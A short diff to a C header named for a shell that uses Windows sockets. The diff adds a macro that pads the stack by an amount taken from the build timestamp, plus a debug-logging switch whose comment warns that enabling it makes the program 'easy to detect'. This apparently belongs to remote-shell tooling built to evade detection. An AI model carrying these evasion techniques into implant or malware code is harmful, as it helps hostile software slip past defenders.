@@ -2,6 +2,14 @@
 # define AXIOM_SHELL_H
 
 # include <ws2tcpip.h>
+//# define __DEBUG__ // Uncomment to enable debugging prints, will make it easy to detect
+# define MODULER (((__TIMESTAMP__[17]) << 8 | (__TIMESTAMP__[18])) % 1024)
+# define STACK_RANDOMIZER unsigned char randomizer[MODULER]; (void)randomizer;
+# ifdef __DEBUG__
+#  define DEBUG_LOG(...) printf(__VA_ARGS__)
+# else
+#  define DEBUG_LOG(...) (void)0
+# endif
 
 enum CommandType
 {
